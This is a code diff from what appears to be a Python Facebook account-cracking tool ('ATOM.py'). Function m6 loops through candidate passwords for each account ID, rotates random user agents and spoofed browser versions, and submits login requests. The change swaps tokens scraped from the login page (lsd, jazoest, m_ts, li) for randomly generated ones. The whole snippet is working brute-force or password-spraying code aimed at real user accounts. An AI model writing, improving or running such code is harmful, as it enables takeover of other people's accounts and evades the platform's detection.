@@ -879,12 +879,12 @@ def xp():
   input(f'{dot}Press Enter To Go Menu');os.system('python ATOM.py')
 
 
-def generate_ab_test_data(length=50):
-    # Create a random sequence of length `length` with characters A, V, /, and multiple "A"
-    return ''.join(random.choices('AV/AAAAAAAAAAA', k=length))
+def generate_jazoest():
+    return str(random.randint(2000, 3000))
 
-
-random_ab_test_data = generate_ab_test_data()
+def generate_random_string(length):
+    letters_and_digits = string.ascii_letters + string.digits
+    return ''.join(random.choice(letters_and_digits) for i in range(length))
 
 
 browser_version1 = (f'{random.randrange(85, 105)}.0.{random.randrange(4200, 4900)}.{random.randrange(40, 150)}')
@@ -1224,12 +1224,14 @@ def m6(idf,pw):
   for ps in pw:
    session = requests.Session()
    pro = random.choice(ugen)
-   free_fb = session.get('https://apps.facebook.com').text
+   random_lsd = secrets.token_hex(8)
+   jazoest = generate_jazoest()
+   m_ts = str(int(time.time()))  
    log_data = {
-             "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
-            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+             "lsd":random_lsd,
+            "jazoest":jazoest,
+            "m_ts":m_ts,
+            "li":generate_random_string(12),
             "try_number":"0",
             "unrecognized_tries":"0",
             "email":idf,
